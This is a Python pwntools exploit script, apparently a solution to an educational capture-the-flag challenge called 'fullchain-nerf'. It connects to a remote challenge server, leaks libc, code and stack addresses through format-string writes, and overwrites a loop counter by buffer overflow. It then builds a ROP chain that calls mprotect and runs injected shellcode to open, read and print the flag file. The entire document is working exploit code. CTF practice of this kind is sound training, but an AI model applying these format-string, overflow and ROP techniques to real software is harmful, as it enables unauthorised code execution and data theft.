from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote('edu-ctf.zoolab.org', 30206)
#r = process('./fullchain-nerf')




# get libc address
r.sendafter('global or local > ', b'local\n')
# gdb.attach(r)
r.sendafter('set, read or write > ', b'write%19$p\n')
r.recvuntil('x')
leak = int(r.recvuntil('g')[:-1].decode('utf-8'), 16)
libc = leak - 0x270b3
print('leak: ' + hex(leak))
print('libc: ' + hex(libc))


# change cnt number
r.sendlineafter("lobal or local > ", b'local')
r.sendlineafter('set, read or write > ', b'read')
r.sendlineafter("length > ", str(0x60))
r.sendline(b"A" * 0x24 + p32(10))



# get code address
r.sendafter('lobal or local > ', b'local\n')
r.sendafter('set, read or write > ', b'write%23$p\n')
r.recvuntil('x')
main = int(r.recvuntil('g')[:-1].decode('utf-8'), 16)
code = main - 0x15fd
print('code: ' + hex(code))

write_fun = libc + 0x1111d0
read_fun = libc + 0x111130

pop_rdi_ret = libc + 0x26b72
pop_rsi_ret = libc + 0x27529
pop_rdx_ret = libc + 0x11c371
pop_rax_ret = libc + 0x4a550
read_address = code + 0x142f
open_sys = libc + 0x110ea9
mprotect_libc = libc + 0x11bb00
flag = b'/home/fullchain-nerf/flag'
flag += (0x20 - len(flag)) * b'\0'

# leak stack address
r.sendafter('lobal or local > ', b'local\n')
r.sendafter('set, read or write > ', b'write%15$p\n')
r.recvuntil('x')
leak = int(r.recvuntil('g')[:-1].decode('utf-8'), 16)
print('leak: ' + hex(leak))
rbp = leak +  0x30 + 0x30
rop_cnt = 0x200
rop_address = rbp + 0x8


# change cnt number
r.sendlineafter("lobal or local > ", b'local')
r.sendlineafter('set, read or write > ', b'read')
r.sendlineafter("length > ", str(0x60))
payload = flag + p64(0) + p64(0xdeadbeef) + p64(rbp) + p64(read_address) + p64(0xdeadbeef) + p64(rop_address) + p64(0) + p64(rop_cnt)
r.send(payload)

#r.sendline(b"A" * 0x18 + p64(write_address) + p64(0) + p64(cnt) + p64(rbp) + p64(read_address) )
pagesize = 0x1000
payload = flat (
    pop_rax_ret, 0xa,
    pop_rdi_ret, rbp - (rbp % pagesize), # file name
    pop_rsi_ret, pagesize,
    pop_rdx_ret, 7, 0xdeadbeef,
    mprotect_libc, rbp + 0x60,
)

payload += asm("""
    mov rax, 0x2
    """ +
    f"mov rdi, {rbp - 0x60}" + """
    mov rsi, 0x0
    syscall

    mov rax, 0x0
    mov rdi, 0x3
    """ +
    f"mov rsi, {rbp - 0x60}" + """
    mov rdx, 0x100
    syscall

    mov rax, 0x1
    mov rdi, 0x1
    """ +
    f"mov rsi, {rbp - 0x60}" + """
    mov rdx, 0x100
    syscall
    """)


r.sendline(payload)
r.interactive()
